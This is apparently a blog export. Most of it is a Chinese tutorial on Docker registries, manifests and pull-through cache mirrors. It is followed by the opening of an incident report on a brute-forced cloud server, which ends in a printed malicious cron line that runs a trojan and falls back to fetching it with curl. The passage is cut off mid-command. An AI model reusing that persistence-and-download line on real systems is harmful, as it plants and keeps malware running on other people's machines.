Hub</code>拉取镜像，这个特性对于一些在他们环境中拥有数量庞大的Docker引擎的用户来说很有用。</p>\n<h2 id=\"image命名规则\"><a href=\"#image命名规则\" class=\"headerlink\" title=\"image命名规则\"></a>image命名规则</h2><p>容器镜像（iamge）的命名规则是：<code>myregistrydomain:port/foo/bar</code>，其中包含了几个关键信息：HUB域名或IP地址、端口号、仓库名、软件名、标记名。<br>例如，命令<code>docker pull harbor.caogo.local:80/library/mongo:3.6</code>的含义是：从<code>harbor.caogo.local</code>服务器，通过http端口，获取liblary仓库的mongo软件镜像，标签为3.6</p>\n<p><code>docker.io</code>是Docker的官方HUB，其中<code>/library</code>是官方仓库所在位置，而<code>/calico</code>等则是开发者在官方HUB的自定义仓库。因此，Docker规定官方镜像可以采用省略所有前缀的简写方式，即：<br><code>docker pull docker.io/library/ubuntu</code> &#x3D;&#x3D; <code>docker pull ubuntu</code></p>\n<p>常用的镜像仓库HUB包括：</p>\n<ul>\n<li><code>registry-1.docker.io</code>                    Docker官方镜像</li>\n<li><code>k8s.gcr.io</code>                              Google Kubernetes系统镜像</li>\n<li><code>quay.io</code>                                 重要的第三方镜像</li>\n<li><code>registry.cn-hangzhou.aliyuncs.com</code>       阿里云的系统镜像</li>\n</ul>\n<h2 id=\"docker-pull-镜像拉取流程\"><a href=\"#docker-pull-镜像拉取流程\" class=\"headerlink\" title=\"docker pull 镜像拉取流程\"></a>docker pull 镜像拉取流程</h2><p>根据<a href=\"https://docs.docker.com/registry/spec/api/#pulling-an-image\">Pulling An Image 官方文档</a>的解释：</p>\n<blockquote>\n<p>An “image” is a combination of a JSON manifest and individual layer files.</p>\n</blockquote>\n<p>一个镜像image包含了以下要素：</p>\n<ul>\n<li>名称 name：The name of the image.</li>\n<li>标记 tag：The tag for this version of the image.</li>\n<li>分层文件 fsLayers：A list of layer descriptors (including digest)</li>\n<li>签名 signature：A JWS used to verify the manifest content</li>\n</ul>\n<blockquote>\n<p>image已经建立了行业标准 - OCI(Open Container Initiative)镜像规范，确保Docker、Podman等不同容器产品之间共享image，可以参见附录继续研究</p>\n</blockquote>\n<p>docker pull的过程很复杂，包括鉴权、校验，下载、合并镜像层，解压缩等等，但最核心的是两个步骤：</p>\n<ol>\n<li>发送请求 <code>GET /v2/&lt;name&gt;/manifests/&lt;reference&gt;</code> ，获取镜像的mainfest清单文件<br> reference可以是标记tag，或摘要digest。</li>\n<li>发送请求 <code>GET /v2/&lt;name&gt;/blobs/&lt;digest&gt;</code> ，获取镜像层文件</li>\n</ol>\n<p>通过<code>curl -X GET http://localhost:5000/v2/alpine/manifests/3.6</code>，获取镜像的manifest清单文件，其格式为</p>\n<figure class=\"highlight json\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"punctuation\">&#123;</span></span><br><span class=\"line\">   <span class=\"attr\">&quot;schemaVersion&quot;</span><span class=\"punctuation\">:</span> <span class=\"number\">1</span><span class=\"punctuation\">,</span></span><br><span class=\"line\">   <span class=\"attr\">&quot;name&quot;</span><span class=\"punctuation\">:</span> <span class=\"string\">&quot;alpine&quot;</span><span class=\"punctuation\">,</span></span><br><span class=\"line\">   <span class=\"attr\">&quot;tag&quot;</span><span class=\"punctuation\">:</span> <span class=\"string\">&quot;3.6&quot;</span><span class=\"punctuation\">,</span></span><br><span class=\"line\">   <span class=\"attr\">&quot;architecture&quot;</span><span class=\"punctuation\">:</span> <span class=\"string\">&quot;amd64&quot;</span><span class=\"punctuation\">,</span></span><br><span class=\"line\">   <span class=\"attr\">&quot;fsLayers&quot;</span><span class=\"punctuation\">:</span> <span class=\"punctuation\">[</span></span><br><span class=\"line\">      <span class=\"punctuation\">&#123;</span></span><br><span class=\"line\">         <span class=\"attr\">&quot;blobSum&quot;</span><span class=\"punctuation\">:</span> <span class=\"string\">&quot;sha256:a3ed95caeb02ffe68cdd9fd84406680ae93d633cb16422d00e8a7c22955b46d4&quot;</span></span><br><span class=\"line\">      <span class=\"punctuation\">&#125;</span><span class=\"punctuation\">,</span></span><br><span class=\"line\">      <span class=\"punctuation\">&#123;</span></span><br><span class=\"line\">         <span class=\"attr\">&quot;blobSum&quot;</span><span class=\"punctuation\">:</span> <span class=\"string\">&quot;sha256:5a3ea8efae5d0abb93d2a04be0a4870087042b8ecab8001f613cdc2a9440616a&quot;</span></span><br><span class=\"line\">      <span class=\"punctuation\">&#125;</span></span><br><span class=\"line\">   <span class=\"punctuation\">]</span><span class=\"punctuation\">,</span></span><br><span class=\"line\">   <span class=\"attr\">&quot;history&quot;</span><span class=\"punctuation\">:</span> <span class=\"punctuation\">[</span></span><br><span class=\"line\">      <span class=\"punctuation\">&#123;</span></span><br><span class=\"line\">         <span class=\"attr\">&quot;v1Compatibility&quot;</span><span class=\"punctuation\">:</span> <span class=\"string\">&quot;&#123;\\&quot;architecture\\&quot;:\\&quot;amd64\\&quot;,\\&quot;config\\&quot;:&#123;\\&quot;Hostname\\&quot;:\\&quot;\\&quot;,\\&quot;Domainname\\&quot;:\\&quot;\\&quot;,\\&quot;User\\&quot;:\\&quot;\\&quot;,\\&quot;AttachStdin\\&quot;:false,\\&quot;AttachStdout\\&quot;:false,\\&quot;AttachStderr\\&quot;:false,\\&quot;Tty\\&quot;:false,\\&quot;OpenStdin\\&quot;:false,\\&quot;StdinOnce\\&quot;:false,\\&quot;Env\\&quot;:[\\&quot;PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin\\&quot;],\\&quot;Cmd\\&quot;:[\\&quot;/bin/sh\\&quot;],\\&quot;ArgsEscaped\\&quot;:true,\\&quot;Image\\&quot;:\\&quot;sha256:143f9315f5a85306192ccffd37fbfa65db21f67aaa938c2538bd50f52123a12f\\&quot;,\\&quot;Volumes\\&quot;:null,\\&quot;WorkingDir\\&quot;:\\&quot;\\&quot;,\\&quot;Entrypoint\\&quot;:null,\\&quot;OnBuild\\&quot;:null,\\&quot;Labels\\&quot;:null&#125;,\\&quot;container\\&quot;:\\&quot;fd086f4b9352674c6a1ae4d02051f95a4e0a55cda943c5780483938dedfb2d8f\\&quot;,\\&quot;container_config\\&quot;:&#123;\\&quot;Hostname\\&quot;:\\&quot;fd086f4b9352\\&quot;,\\&quot;Domainname\\&quot;:\\&quot;\\&quot;,\\&quot;User\\&quot;:\\&quot;\\&quot;,\\&quot;AttachStdin\\&quot;:false,\\&quot;AttachStdout\\&quot;:false,\\&quot;AttachStderr\\&quot;:false,\\&quot;Tty\\&quot;:false,\\&quot;OpenStdin\\&quot;:false,\\&quot;StdinOnce\\&quot;:false,\\&quot;Env\\&quot;:[\\&quot;PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin\\&quot;],\\&quot;Cmd\\&quot;:[\\&quot;/bin/sh\\&quot;,\\&quot;-c\\&quot;,\\&quot;#(nop) \\&quot;,\\&quot;CMD [\\\\\\&quot;/bin/sh\\\\\\&quot;]\\&quot;],\\&quot;ArgsEscaped\\&quot;:true,\\&quot;Image\\&quot;:\\&quot;sha256:143f9315f5a85306192ccffd37fbfa65db21f67aaa938c2538bd50f52123a12f\\&quot;,\\&quot;Volumes\\&quot;:null,\\&quot;WorkingDir\\&quot;:\\&quot;\\&quot;,\\&quot;Entrypoint\\&quot;:null,\\&quot;OnBuild\\&quot;:null,\\&quot;Labels\\&quot;:&#123;&#125;&#125;,\\&quot;created\\&quot;:\\&quot;2019-03-07T22:20:00.563496859Z\\&quot;,\\&quot;docker_version\\&quot;:\\&quot;18.06.1-ce\\&quot;,\\&quot;id\\&quot;:\\&quot;baaf9c1caf4fb211f173d053029997dcfade0644ac354c8a068e4ebf23fcf1c5\\&quot;,\\&quot;os\\&quot;:\\&quot;linux\\&quot;,\\&quot;parent\\&quot;:\\&quot;5d8f720b0ab2b92a29a7e338aa90cad32dac2bf6518c7aae5844aab896ee36ec\\&quot;,\\&quot;throwaway\\&quot;:true&#125;&quot;</span></span><br><span class=\"line\">      <span class=\"punctuation\">&#125;</span><span class=\"punctuation\">,</span></span><br><span class=\"line\">      <span class=\"punctuation\">&#123;</span></span><br><span class=\"line\">         <span class=\"attr\">&quot;v1Compatibility&quot;</span><span class=\"punctuation\">:</span> <span class=\"string\">&quot;&#123;\\&quot;id\\&quot;:\\&quot;5d8f720b0ab2b92a29a7e338aa90cad32dac2bf6518c7aae5844aab896ee36ec\\&quot;,\\&quot;created\\&quot;:\\&quot;2019-03-07T22:20:00.434038891Z\\&quot;,\\&quot;container_config\\&quot;:&#123;\\&quot;Cmd\\&quot;:[\\&quot;/bin/sh -c #(nop) ADD file:9714761bb81de664e431dec41f12db20f0438047615df2ecd9fdc88933d6c20f in / \\&quot;]&#125;&#125;&quot;</span></span><br><span class=\"line\">      <span class=\"punctuation\">&#125;</span></span><br><span class=\"line\">   <span class=\"punctuation\">]</span><span class=\"punctuation\">,</span></span><br><span class=\"line\">   <span class=\"attr\">&quot;signatures&quot;</span><span class=\"punctuation\">:</span> <span class=\"punctuation\">[</span></span><br><span class=\"line\">      <span class=\"punctuation\">&#123;</span></span><br><span class=\"line\">         <span class=\"attr\">&quot;header&quot;</span><span class=\"punctuation\">:</span> <span class=\"punctuation\">&#123;</span></span><br><span class=\"line\">            <span class=\"attr\">&quot;jwk&quot;</span><span class=\"punctuation\">:</span> <span class=\"punctuation\">&#123;</span></span><br><span class=\"line\">               <span class=\"attr\">&quot;crv&quot;</span><span class=\"punctuation\">:</span> <span class=\"string\">&quot;P-256&quot;</span><span class=\"punctuation\">,</span></span><br><span class=\"line\">               <span class=\"attr\">&quot;kid&quot;</span><span class=\"punctuation\">:</span> <span class=\"string\">&quot;KMUD:PVGZ:P2LO:LC7C:JSZZ:DCUO:FB3A:VXIA:U7UM:WVMY:7KJT:5TPS&quot;</span><span class=\"punctuation\">,</span></span><br><span class=\"line\">               <span class=\"attr\">&quot;kty&quot;</span><span class=\"punctuation\">:</span> <span class=\"string\">&quot;EC&quot;</span><span class=\"punctuation\">,</span></span><br><span class=\"line\">               <span class=\"attr\">&quot;x&quot;</span><span class=\"punctuation\">:</span> <span class=\"string\">&quot;M5uDyG_04QhZKJx2FFku4t2UUWeYYeyg0-LhmrNf5OQ&quot;</span><span class=\"punctuation\">,</span></span><br><span class=\"line\">               <span class=\"attr\">&quot;y&quot;</span><span class=\"punctuation\">:</span> <span class=\"string\">&quot;TdXi_yetmEqWSEKqTudnjb7tn5m-AVQmxGeknXVL8w8&quot;</span></span><br><span class=\"line\">            <span class=\"punctuation\">&#125;</span><span class=\"punctuation\">,</span></span><br><span class=\"line\">            <span class=\"attr\">&quot;alg&quot;</span><span class=\"punctuation\">:</span> <span class=\"string\">&quot;ES256&quot;</span></span><br><span class=\"line\">         <span class=\"punctuation\">&#125;</span><span class=\"punctuation\">,</span></span><br><span class=\"line\">         <span class=\"attr\">&quot;signature&quot;</span><span class=\"punctuation\">:</span> <span class=\"string\">&quot;xSwT9ePqDKjDm3i9AHkgFxnZGO6TdVIePcl6XxTvrCPSjOx_Xd1jf8YgouhXWDffBygicwp8DDnxJ7bB30puuw&quot;</span><span class=\"punctuation\">,</span></span><br><span class=\"line\">         <span class=\"attr\">&quot;protected&quot;</span><span class=\"punctuation\">:</span> <span class=\"string\">&quot;eyJmb3JtYXRMZW5ndGgiOjIxMzAsImZvcm1hdFRhaWwiOiJDbjAiLCJ0aW1lIjoiMjAyMS0wMS0zMVQxMzo1NjoxNFoifQ&quot;</span></span><br><span class=\"line\">      <span class=\"punctuation\">&#125;</span></span><br><span class=\"line\">   <span class=\"punctuation\">]</span></span><br><span class=\"line\"><span class=\"punctuation\">&#125;</span></span><br></pre></td></tr></table></figure>\n\n<h2 id=\"Docker-Registry-镜像注册服务\"><a href=\"#Docker-Registry-镜像注册服务\" class=\"headerlink\" title=\"Docker Registry 镜像注册服务\"></a>Docker Registry 镜像注册服务</h2><p>Registry是Docker提供的镜像注册服务，其设计目标是一套存储和分发镜像的处理机制，实现方式是在Docker引擎中运行一个来自<code>docker.io/library/registry</code>的实例。</p>\n<p>需要注意的是，Registry管理镜像是基于文件系统的,数据存储目录位于实例所在容器的<code>/var/lib/registry</code></p>\n<figure class=\"highlight console\"><table><tr><td class=\"code\"><pre><span class=\"line\">~ # tree /var/lib/registry</span><br><span class=\"line\">/var/lib/registry</span><br><span class=\"line\">└── docker</span><br><span class=\"line\">    └── registry</span><br><span class=\"line\">        └── v2</span><br><span class=\"line\">            ├── blobs</span><br><span class=\"line\">            │   └── sha256</span><br><span class=\"line\">            │       ├── 36</span><br><span class=\"line\">            │       │   └── 36c3a913e62f77a82582eb7ce30d255f805c3d1e11d58e1f805e14d33c2bc5a5</span><br><span class=\"line\">            │       │       └── data</span><br><span class=\"line\">            │       ├── 43</span><br><span class=\"line\">            │       │   └── 43773d1dba76c4d537b494a8454558a41729b92aa2ad0feb23521c3e58cd0440</span><br><span class=\"line\">            │       │       └── data</span><br><span class=\"line\">            │       ├── 5a</span><br><span class=\"line\">            │       │   └── 5a3ea8efae5d0abb93d2a04be0a4870087042b8ecab8001f613cdc2a9440616a</span><br><span class=\"line\">            │       │       └── data</span><br><span class=\"line\">            │       └── a3</span><br><span class=\"line\">            │           └── a3ed95caeb02ffe68cdd9fd84406680ae93d633cb16422d00e8a7c22955b46d4</span><br><span class=\"line\">            │               └── data</span><br><span class=\"line\">            └── repositories</span><br><span class=\"line\">                ├── alpine</span><br><span class=\"line\">                │   ├── _layers</span><br><span class=\"line\">                │   │   └── sha256</span><br><span class=\"line\">                │   │       ├── 43773d1dba76c4d537b494a8454558a41729b92aa2ad0feb23521c3e58cd0440</span><br><span class=\"line\">                │   │       │   └── link</span><br><span class=\"line\">                │   │       ├── 5a3ea8efae5d0abb93d2a04be0a4870087042b8ecab8001f613cdc2a9440616a</span><br><span class=\"line\">                │   │       │   └── link</span><br><span class=\"line\">                │   │       └── a3ed95caeb02ffe68cdd9fd84406680ae93d633cb16422d00e8a7c22955b46d4</span><br><span class=\"line\">                │   │           └── link</span><br><span class=\"line\">                │   ├── _manifests</span><br><span class=\"line\">                │   │   ├── revisions</span><br><span class=\"line\">                │   │   │   └── sha256</span><br><span class=\"line\">                │   │   │       └── 36c3a913e62f77a82582eb7ce30d255f805c3d1e11d58e1f805e14d33c2bc5a5</span><br><span class=\"line\">                │   │   │           └── link</span><br><span class=\"line\">                │   │   └── tags</span><br><span class=\"line\">                │   │       └── 3.6</span><br><span class=\"line\">                │   │           ├── current</span><br><span class=\"line\">                │   │           │   └── link</span><br><span class=\"line\">                │   │           └── index</span><br><span class=\"line\">                │   │               └── sha256</span><br><span class=\"line\">                │   │                   └── 36c3a913e62f77a82582eb7ce30d255f805c3d1e11d58e1f805e14d33c2bc5a5</span><br><span class=\"line\">                │   │                       └── link</span><br><span class=\"line\">                │   └── _uploads</span><br><span class=\"line\">                └── myregistry</span><br><span class=\"line\">                    ├── _layers</span><br><span class=\"line\">                    │   └── sha256</span><br><span class=\"line\">                    │       ├── 43773d1dba76c4d537b494a8454558a41729b92aa2ad0feb23521c3e58cd0440</span><br><span class=\"line\">                    │       │   └── link</span><br><span class=\"line\">                    │       ├── 5a3ea8efae5d0abb93d2a04be0a4870087042b8ecab8001f613cdc2a9440616a</span><br><span class=\"line\">                    │       │   └── link</span><br><span class=\"line\">                    │       └── a3ed95caeb02ffe68cdd9fd84406680ae93d633cb16422d00e8a7c22955b46d4</span><br><span class=\"line\">                    │           └── link</span><br><span class=\"line\">                    ├── _manifests</span><br><span class=\"line\">                    │   ├── revisions</span><br><span class=\"line\">                    │   │   └── sha256</span><br><span class=\"line\">                    │   │       └── 36c3a913e62f77a82582eb7ce30d255f805c3d1e11d58e1f805e14d33c2bc5a5</span><br><span class=\"line\">                    │   │           └── link</span><br><span class=\"line\">                    │   └── tags</span><br><span class=\"line\">                    │       └── latest</span><br><span class=\"line\">                    │           ├── current</span><br><span class=\"line\">                    │           │   └── link</span><br><span class=\"line\">                    │           └── index</span><br><span class=\"line\">                    │               └── sha256</span><br><span class=\"line\">                    │                   └── 36c3a913e62f77a82582eb7ce30d255f805c3d1e11d58e1f805e14d33c2bc5a5</span><br><span class=\"line\">                    │                       └── link</span><br><span class=\"line\">                    └── _uploads</span><br><span class=\"line\"></span><br><span class=\"line\">48 directories, 16 files</span><br></pre></td></tr></table></figure>\n\n<p>Registry的默认配置文件，位于实例所在容器的<code>/etc/docker/registry/config.yml</code>，默认基本内容是：<br>全量配置信息请见<a href=\"https://docs.docker.com/registry/configuration/#list-of-configuration-options\">config.yml</a></p>\n<figure class=\"highlight console\"><table><tr><td class=\"code\"><pre><span class=\"line\">~ # cat /etc/docker/registry/config.yml</span><br><span class=\"line\">version: 0.1</span><br><span class=\"line\">log:</span><br><span class=\"line\">  fields:</span><br><span class=\"line\">    service: registry</span><br><span class=\"line\">storage:</span><br><span class=\"line\">  cache:</span><br><span class=\"line\">    blobdescriptor: inmemory</span><br><span class=\"line\">  filesystem:</span><br><span class=\"line\">    rootdirectory: /var/lib/registry</span><br><span class=\"line\">http:</span><br><span class=\"line\">  addr: :5000</span><br><span class=\"line\">  headers:</span><br><span class=\"line\">    X-Content-Type-Options: [nosniff]</span><br><span class=\"line\">health:</span><br><span class=\"line\">  storagedriver:</span><br><span class=\"line\">    enabled: true</span><br><span class=\"line\">    interval: 10s</span><br><span class=\"line\">    threshold: 3</span><br></pre></td></tr></table></figure>\n\n<blockquote>\n<p>Docker提供的标准镜像服务称为<code>registry</code>，当前版本是由go语言开发的v2（之前python开发的registry v1在网上已被标为废弃，最后版本是v1.6）, 新版 registry v2对镜像存储格式进行了重新设计，并且和旧版还不兼容，docker从1.6版本开始支持registry v2。</p>\n</blockquote>\n<h2 id=\"基于Registry的直通缓存服务（pull-through-cache）\"><a href=\"#基于Registry的直通缓存服务（pull-through-cache）\" class=\"headerlink\" title=\"基于Registry的直通缓存服务（pull-through cache）\"></a>基于Registry的直通缓存服务（pull-through cache）</h2><p>如果您的环境中运行着多个Docker实例，例如多个物理机或虚拟机都运行Docker，则每个Docker守护程序都将访问Internet，并从Docker Hub获取本地没有的映像。<br>为此，我们可以部署一个本地Registry Mirror服务，并将所有Docker引擎的Mirror Sever指向该服务器，以免产生额外的互联网流量。</p>\n<h3 id=\"Registry-mirror的原理\"><a href=\"#Registry-mirror的原理\" class=\"headerlink\" title=\"Registry mirror的原理\"></a>Registry mirror的原理</h3><p>Docker Hub的镜像数据分为两部分：index数据和registry数据。前者保存了镜像的一些元数据信息，数据量很小；后者保存了镜像的实际数据，数据量比较大。平时我们使用docker pull命令拉取一个镜像时的过程是：先去index获取镜像的一些元数据，然后再去registry获取镜像数据。</p>\n<p>所谓registry mirror就是搭建一个registry，然后将docker hub的registry数据缓存到自己本地的registry。<br>整个过程是：当我们使用docker pull去拉镜像的时候，会先从我们本地的registry mirror去获取镜像数据，如果不存在，registry mirror会先从docker hub的registry拉取数据进行缓存，再传给我们。</p>\n<p>整个过程是流式的，registry mirror并不会等全部缓存完再给我们传，而且边缓存边给客户端传。</p>\n<p>对于缓存，我们都知道一致性非常重要。<br>registry mirror与docker官方保持一致的方法是：registry mirror只是缓存了docker hub的registry数据，并不缓存index数据。<br>所以我们pull镜像的步骤是：</p>\n<ul>\n<li>先连docker hub的index获取镜像的元数据，如果我们registry mirror里面有该镜像的缓存，且数据与从index处获取到的元数据一致，则从registry mirror拉取；</li>\n<li>如果我们的registry mirror有该镜像的缓存，但数据与index处获取的元数据不一致，或者根本就没有该镜像的缓存，则先从docker hub的registry缓存或者更新数据。</li>\n</ul>\n<h3 id=\"1-服务端的部署方法\"><a href=\"#1-服务端的部署方法\" class=\"headerlink\" title=\"1. 服务端的部署方法\"></a>1. 服务端的部署方法</h3><p>在一个已经安装Docker引擎的服务器<code>192.168.0.147</code>上部署一个Regsitry服务，其配置文件中，可以增加proxy配置段支持代理缓存服务，格式为：</p>\n<figure class=\"highlight yaml\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"attr\">proxy:</span></span><br><span class=\"line\">  <span class=\"attr\">remoteurl:</span> <span class=\"string\">https://registry-1.docker.io</span></span><br><span class=\"line\">  <span class=\"attr\">username:</span> [<span class=\"string\">username</span>]</span><br><span class=\"line\">  <span class=\"attr\">password:</span> [<span class=\"string\">password</span>]</span><br></pre></td></tr></table></figure>\n\n<p>注意，缓存默认保存7天，配置信息位于：</p>\n<figure class=\"highlight yaml\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"attr\">storage:</span></span><br><span class=\"line\">  <span class=\"attr\">maintenance:</span></span><br><span class=\"line\">    <span class=\"attr\">uploadpurging:</span></span><br><span class=\"line\">      <span class=\"attr\">enabled:</span> <span class=\"literal\">true</span></span><br><span class=\"line\">      <span class=\"attr\">age:</span> <span class=\"string\">168h</span></span><br><span class=\"line\">      <span class=\"attr\">interval:</span> <span class=\"string\">24h</span></span><br><span class=\"line\">      <span class=\"attr\">dryrun:</span> <span class=\"literal\">false</span></span><br><span class=\"line\">    <span class=\"attr\">readonly:</span></span><br><span class=\"line\">      <span class=\"attr\">enabled:</span> <span class=\"literal\">false</span></span><br></pre></td></tr></table></figure>\n\n<p><code>uploadpurging</code>是一个后台过程，该过程会定期从注册表的<code>uploads</code>目录中删除孤立的文件。<br>默认情况下启用该后台进程，并设置以下参数。</p>\n<blockquote>\n<p>TODO: 缓存的镜像的有效期默认是一周（168hour），这个配置似乎并不解决？？？</p>\n</blockquote>\n<table>\n<thead>\n<tr>\n<th align=\"center\">参数名称</th>\n<th align=\"center\">必选项</th>\n<th align=\"left\">描述</th>\n</tr>\n</thead>\n<tbody><tr>\n<td align=\"center\">enabled</td>\n<td align=\"center\">yes</td>\n<td align=\"left\">Set to true to enable upload purging. Defaults to true.</td>\n</tr>\n<tr>\n<td align=\"center\">age</td>\n<td align=\"center\">yes</td>\n<td align=\"left\">Upload directories which are older than this age will be deleted.Defaults to 168h (1 week).</td>\n</tr>\n<tr>\n<td align=\"center\">interval</td>\n<td align=\"center\">yes</td>\n<td align=\"left\">The interval between upload directory purging. Defaults to 24h.</td>\n</tr>\n<tr>\n<td align=\"center\">dryrun</td>\n<td align=\"center\">yes</td>\n<td align=\"left\">Set dryrun to true to obtain a summary of what directories will be deleted. Defaults to false.</td>\n</tr>\n</tbody></table>\n<blockquote>\n<p>获取Resistry默认配置文件的方法：<br><code>docker run -it --rm --entrypoint cat registry:2 /etc/docker/registry/config.yml</code></p>\n</blockquote>\n<p>因此，你可以在启动Registry服务时挂载自定义yml文件的方式，实现pull-through cache。</p>\n<figure class=\"highlight sh\"><table><tr><td class=\"code\"><pre><span class=\"line\">docker run -d --restart=always --name registry \\</span><br><span class=\"line\">    -p 5000:5000 \\</span><br><span class=\"line\">    -v /data:/var/lib/registry \\</span><br><span class=\"line\">    -v ./myconfig.yml:/var/lib/registry/config.yml \\</span><br><span class=\"line\">    registry:2 </span><br></pre></td></tr></table></figure>\n\n<p>还有一个更方便的方法，不用修改配置文件，直接在启动Registry服务时设置环境变量即可，例如：</p>\n<figure class=\"highlight sh\"><table><tr><td class=\"code\"><pre><span class=\"line\">docker run -p 5000:5000 -d --restart=always --name registry   \\</span><br><span class=\"line\">  -e REGISTRY_PROXY_REMOTEURL=https://registry-1.docker.io \\</span><br><span class=\"line\">  -v /data:/var/lib/registry \\</span><br><span class=\"line\">  registry:2</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<h3 id=\"2-服务端的测试方法\"><a href=\"#2-服务端的测试方法\" class=\"headerlink\" title=\"2. 服务端的测试方法\"></a>2. 服务端的测试方法</h3><p>检查Registry服务是否正常启动，可以通过以下方法：</p>\n<figure class=\"highlight console\"><table><tr><td class=\"code\"><pre><span class=\"line\">[root@bl-local ~]# curl -ski -X GET http://localhost:5000/v2/_catalog</span><br><span class=\"line\">HTTP/1.1 200 OK</span><br><span class=\"line\">Content-Type: application/json; charset=utf-8</span><br><span class=\"line\">Docker-Distribution-Api-Version: registry/2.0</span><br><span class=\"line\">X-Content-Type-Options: nosniff</span><br><span class=\"line\">Date: Sun, 31 Jan 2021 15:58:44 GMT</span><br><span class=\"line\">Content-Length: 66</span><br><span class=\"line\"></span><br><span class=\"line\">&#123;&quot;repositories&quot;:[&quot;calico/cni&quot;,&quot;library/alpine&quot;,&quot;library/python&quot;]&#125;</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"3-客户端的配置方法\"><a href=\"#3-客户端的配置方法\" class=\"headerlink\" title=\"3.客户端的配置方法\"></a>3.客户端的配置方法</h3><p>作为直通镜像使用方，需要修改Docker引擎配置文件<code>/etc/docker/daemon.json</code>，并在其中增加<code>registry-mirrors</code>信息段</p>\n<figure class=\"highlight sh\"><table><tr><td class=\"code\"><pre><span class=\"line\">root@d7y-2:~<span class=\"comment\"># cat &lt;&lt;EOD &gt;/etc/docker/daemon.json</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\"><span class=\"string\">&quot;registry-mirrors&quot;</span>: [<span class=\"string\">&quot;http://192.168.0.147:5000&quot;</span>]</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">EOD</span><br></pre></td></tr></table></figure>\n\n<p>当然，你也可以在Docker守护进程上，增加启动配置信息，例如：<br><code>--registry-mirror=https://&lt;my-docker-mirror-host&gt;:&lt;port-number&gt;</code></p>\n<h2 id=\"结论\"><a href=\"#结论\" class=\"headerlink\" title=\"结论\"></a>结论</h2><ol>\n<li>Docker Registry提供的Pull-throgh cache服务部署很方便，但是缺乏UI管理界面导致维护比较困难，一般适合小规模本地部署。</li>\n<li>受到Docker pull机制的制约，Mirror仅支持Docker官方镜像，第三方或者私有仓库的mirror服务比较困难。</li>\n<li>由于Registry负责管理镜像的mainfest信息和镜像层文件，而所有docker pull都是基于上述标准流程和接口方式，因此Harbor、Dragnonfly等镜像管理产品都是必须基于Registry开发，并增加了一些复制、分发、UI管理等功能。</li>\n</ol>\n<hr>\n<h2 id=\"参考文献\"><a href=\"#参考文献\" class=\"headerlink\" title=\"参考文献\"></a>参考文献</h2><ul>\n<li><a href=\"https://docs.docker.com/registry/recipes/mirror/\">Docker Mirror官方文档</a></li>\n<li><a href=\"https://niyanchun.com/deploy-registry-mirror.html\">搭建registry mirror的操作记录</a></li>\n<li><a href=\"https://cloud.tencent.com/developer/article/1413239\">一种Harbor部署私有Mirror服务的不正规方法</a></li>\n<li><a href=\"https://www.sohu.com/a/421272143_609552\">Harbor 2.1新增镜像代理和P2P镜像预热功能</a></li>\n<li><a href=\"https://github.com/dragonflyoss/Dragonfly/issues/525\">为什么 Dragonfly 不能很好的支持 HTTPS 镜像仓库</a></li>\n<li><a href=\"https://github.com/moby/moby/pull/34319\">Github关于Add private-registry mirror support的讨论</a></li>\n<li><a href=\"https://blog.csdn.net/ztsinghua/article/details/51496658\">Docker Registry API接口示例</a></li>\n<li><a href=\"https://blog.csdn.net/hyzhou33550336/article/details/65633502\">容器OCI规范 镜像规范</a></li>\n<li><a href=\"https://xuanwo.io/2019/08/06/oci-intro/\">开放容器标准(OCI) 内部分享</a></li>\n<li><a href=\"https://developer.aliyun.com/article/707053\">浙江移动容器云基于 Dragonfly 的统一文件分发平台生产实践</a></li>\n<li><a href=\"https://my.oschina.net/markz0928/blog/856652\">Docker Registry&#x2F;Distribution概述</a></li>\n</ul>\n"},{"title":"ECS遭遇安全攻击的一次经历","url":"/2019/05/04/ECS%E9%81%AD%E9%81%87%E5%AE%89%E5%85%A8%E6%94%BB%E5%87%BB%E7%9A%84%E4%B8%80%E6%AC%A1%E7%BB%8F%E5%8E%86/","content":"<p>突然，腾讯云发出安全提示信息，先是SSH暴力破解的警告，过了几天又是ECS被植入木马的警告，Linux的安全防护被提上日程了！</p>\n<h2 id=\"服务器的问题表现\"><a href=\"#服务器的问题表现\" class=\"headerlink\" title=\"服务器的问题表现\"></a>服务器的问题表现</h2><img src=\"/2019/05/04/ECS%E9%81%AD%E9%81%87%E5%AE%89%E5%85%A8%E6%94%BB%E5%87%BB%E7%9A%84%E4%B8%80%E6%AC%A1%E7%BB%8F%E5%8E%86/alert-0.png\" class=\"\" title=\"腾讯云的警告信息汇总\">\n\n<ul>\n<li>登录ECS服务器，用<code>top</code>命令检查系统状态，发现CPU负荷长期维持100%，系统响应缓慢，其中<code>/tmp/vThHH</code>严重消耗资源，确认中招了！</li>\n</ul>\n<img src=\"/2019/05/04/ECS%E9%81%AD%E9%81%87%E5%AE%89%E5%85%A8%E6%94%BB%E5%87%BB%E7%9A%84%E4%B8%80%E6%AC%A1%E7%BB%8F%E5%8E%86/alert-1.png\" class=\"\" title=\"SSH暴力破解的警告信息\">\n\n<ul>\n<li>服务器的root口令没有变化，但登录成功时提示有几百个<code>failed login attempts</code>，说明SSH口令已经被暴力破解</li>\n</ul>\n<h2 id=\"系统检查的主要工作\"><a href=\"#系统检查的主要工作\" class=\"headerlink\" title=\"系统检查的主要工作\"></a>系统检查的主要工作</h2><p>主要从以下几个方面入手：</p>\n<ol>\n<li><p>检查网络服务</p>\n<p> 使用<code>netstat -nlp</code>，发现除了22，80，443端口，还对外暴露了可疑的7946端口，调用者是<code>/tmp/vThHH</code>。</p>\n</li>\n<li><p>检查系统进程</p>\n<p> 通过<code>ps -ef</code>命令，跟踪可疑进程<code>/tmp/vThHH</code>，发现父进程就是木马程序<code>/usr/bin/ybznfa2</code>。<br> 进一步检查，发现了木马的加载进程。</p>\n <figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">root      4365   736  0 18:30 ?        00:00:00 /usr/sbin/CROND -n</span><br><span class=\"line\">root      4366  4365  0 18:30 ?        00:00:00 /bin/sh -c (/usr/bin/ybznfa2||/usr/libexec/ybznfa2||/usr/local/bin/ybznfa2||/tmp/ybznfa2||curl 